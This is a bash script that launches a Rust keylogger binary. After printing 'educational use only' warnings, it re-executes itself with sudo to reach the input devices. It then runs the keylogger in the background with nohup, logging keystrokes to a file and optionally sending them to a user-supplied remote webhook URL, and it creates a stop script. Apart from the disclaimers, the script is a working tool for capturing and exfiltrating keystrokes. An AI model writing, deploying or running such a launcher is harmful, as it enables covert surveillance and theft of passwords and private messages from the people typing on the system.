#!/bin/bash

# Rust Keylogger Auto-run Script
# WARNING: For Educational and Authorized Security Testing Only!
# Unauthorized use may be illegal in your jurisdiction.

echo "=========================================="
echo "  Rust Keylogger Auto-run Script"
echo "=========================================="
echo ""
echo "WARNING: Educational Use Only"
echo ""
echo "This script will activate a keylogger that records"
echo "keystrokes from keyboards on this system."
echo ""
echo "Requirements:"
echo "  • You own this system or have explicit permission"
echo "  • Unauthorized keylogging may be illegal"
echo ""
read -p "Do you want to continue? (yes/no): " CONFIRM
echo ""

if [ "$CONFIRM" != "yes" ] && [ "$CONFIRM" != "YES" ] && [ "$CONFIRM" != "y" ]; then
    echo "Operation cancelled."
    exit 0
fi

echo "Proceeding with setup..."
echo ""

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Check if the binary exists
BINARY_PATH="$SCRIPT_DIR/rust-key"
if [ ! -f "$BINARY_PATH" ]; then
    echo "Error: rust-key binary not found at $BINARY_PATH"
    echo "Please build the project first: cargo build --release"
    echo "Then copy the binary: cp target/release/rust-key ."
    exit 1
fi

# Make the binary executable if it isn't already
chmod +x "$BINARY_PATH" 2>/dev/null || true

echo "Script location: $SCRIPT_DIR"
echo "Binary location: $BINARY_PATH"
echo ""

# Check if running with sudo (required for keylogger to access input devices)
if [ "$EUID" -ne 0 ]; then
    echo "This script requires sudo/root permissions to access input devices."
    echo "Restarting with sudo..."
    echo ""
    exec sudo bash "$0" "$@"
fi

echo "Running with sudo privileges"
echo ""

# Prompt for webhook URL
echo "Webhook Configuration"
echo "Enter a webhook URL to send keystrokes remotely (optional)."
echo "Press Enter to skip if you only want local logging."
echo ""
read -p "Webhook URL (or press Enter to skip): " WEBHOOK_URL

# Validate webhook URL if provided
if [ -n "$WEBHOOK_URL" ]; then
    if [[ ! "$WEBHOOK_URL" =~ ^https?:// ]]; then
        echo "Warning: URL should start with http:// or https://"
        echo "Proceeding anyway..."
    fi
    echo ""
    echo "Webhook URL configured: $WEBHOOK_URL"
else
    echo ""
    echo "No webhook URL provided. Keys will only be saved to file."
fi

echo ""
echo "=========================================="
echo "  Starting Keylogger"
echo "=========================================="
echo ""

# Change to the script directory
cd "$SCRIPT_DIR"

# Create a log directory if it doesn't exist
mkdir -p "$SCRIPT_DIR/logs"

# Run the keylogger
if [ -n "$WEBHOOK_URL" ]; then
    nohup "$BINARY_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
    KEYLOGGER_PID=$!
else
    nohup "$BINARY_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
    KEYLOGGER_PID=$!
fi

echo "Keylogger started with PID: $KEYLOGGER_PID"
echo ""
echo "Keystrokes will be logged to: $SCRIPT_DIR/logs/keylog.txt"
if [ -n "$WEBHOOK_URL" ]; then
    echo "Keystrokes will be sent to: $WEBHOOK_URL"
fi
echo ""
echo "To stop the keylogger, run: sudo kill $KEYLOGGER_PID"
echo ""

# Create a stop script for convenience
cat > "$SCRIPT_DIR/stop_keylogger.sh" << EOF
#!/bin/bash
echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
if sudo kill $KEYLOGGER_PID 2>/dev/null; then
    echo "Keylogger stopped"
else
    echo "Keylogger not found or already stopped"
fi
EOF

chmod +x "$SCRIPT_DIR/stop_keylogger.sh" 2>/dev/null || true
echo "A stop script has been created: $SCRIPT_DIR/stop_keylogger.sh"
echo ""
